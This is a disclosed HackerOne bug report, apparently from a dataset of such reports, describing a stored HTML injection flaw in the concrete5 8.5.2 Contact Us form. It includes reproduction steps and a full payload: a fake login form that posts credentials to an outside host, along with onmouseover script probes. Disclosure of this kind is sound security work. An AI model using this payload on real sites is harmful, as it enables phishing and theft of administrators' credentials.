---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '768327'
original_report_id: '768327'
title: Unauthenticated HTML Injection Stored - ContactUs form
team_handle: concretecms
created_at: '2020-01-05T03:45:56.204Z'
disclosed_at: '2020-09-25T14:00:58.017Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 6
asset_identifier: https://github.com/concrete5/concrete5
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# Unauthenticated HTML Injection Stored - ContactUs form

## Metadata

- HackerOne Report ID: 768327
- Weakness: 
- Program: concretecms
- Disclosed At: 2020-09-25T14:00:58.017Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Unauthenticated HTML Injection Stored - ContactUs form

• Title: concrete5-8.5.2 HTML Injection Stored - Contact Us form
• Keyword: crayons
• Software : concrete5
• Product Version: 8.5.2
• Vulnerability : HTML Injection Stored
• Vulnerable component: Contact Us form
• Vulnerability : HTML Injection Stored

Concrete5 latest version 8.5.2 suffer from unauthenticated persistent (Stored) HTML injection vulnerabilities.
Insufficient validation of user input on the unauthenticated part of the Concrete5 application exposes the application to Stored HTML Injection vulnerabilities.
These vulnerabilities enable potentially dangerous input from the user to be accepted by the application and then embedded back in the HTML response of the page returned by the web server.

It is clear that a html injection bug exists on the ConcatUs form in the message part, and allows an attacker (public user) to submit contact us form with malicious HTML/JavaScript payload. The message gets sent to Administrator and if the admin click to any parts of the form it will be redirected to malicious site.

 - Steps to reproduce: 
1. Visit contactus form and fill out the form then inject below HTML payload into the Messages (See screenshot 1) F675603
2. Now login as Admin and check 'Waiting for me' messages. Click on contact (See screenshot 2) F675604
3. Once the contact is open you will notice big image embedded and  HTML phishing form for username and password is also embedded and if you click on OK you will be redirected to malicious site (See screenshot 3) F675605




# Malicious HTML Payload here:


   <html><body><head><meta content="text/html; charset=utf-8"></meta></head>
  <div style="text-align: center;"><form Method="POST" Action="http://www.test.com/">
  Phishingpage :<br /><br/>Username :<br /> <input name="User" /><br />Password :<br /> 
  <input name="Password" type="password" /><br /><br /><input name="Valid" value="Ok !" type="submit" />
  <br /></form></div></body></html>
<input><input"/onmouseover="confirm(3333);//"onload=onload><input><innerHTML><img src="https://www.petmd.com/sites/default/files/Acute-Dog-Diarrhea-47066074.jpg" width="1000" height="750" alt="onmouseover=prompt(1);//" /></a></input>

## Impact

It is clear that a html injection bug exists on the ConcatUs form in the message part, and allows an attacker (public user) to submit contact us form with malicious HTML/JavaScript payload. The message gets sent to Administrator and if the admin click to any parts of the form it will be redirected to malicious site.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
